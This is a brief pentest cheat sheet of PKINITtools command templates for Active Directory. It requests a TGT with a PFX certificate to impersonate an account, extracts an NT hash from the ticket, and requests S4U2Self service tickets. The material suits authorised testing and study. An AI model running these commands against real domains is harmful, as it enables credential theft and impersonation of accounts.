# PKINITtools

% adcs, certificate, pki, windows, Active directory, template, shadow credential


## PKINITtools - Request a TGT using a PFX
#plateform/linux #target/remote #cat/RECON
```
gettgtpkinit -cert-pfx <pfx_file_> -pfx-pass <pfx_password|jubeaz> -dc-ip <dc_ip> <domain>/<accountToImpersonate> <ccache_path>
```

## PKINITtools - hash from TGT and AS REP key
#plateform/linux #target/remote #cat/RECON
```
export KRB5CCNAME=<cache-path> && getnthash <domain>/<ComputerAccount> -key <key>
```

## PKINITtools - silver ticket
#plateform/linux #target/remote #cat/RECON
```
gets4uticket 
```
Uses Kerberos S4U2Self to request a service ticket that is valid on the host for which you've obtained a certificate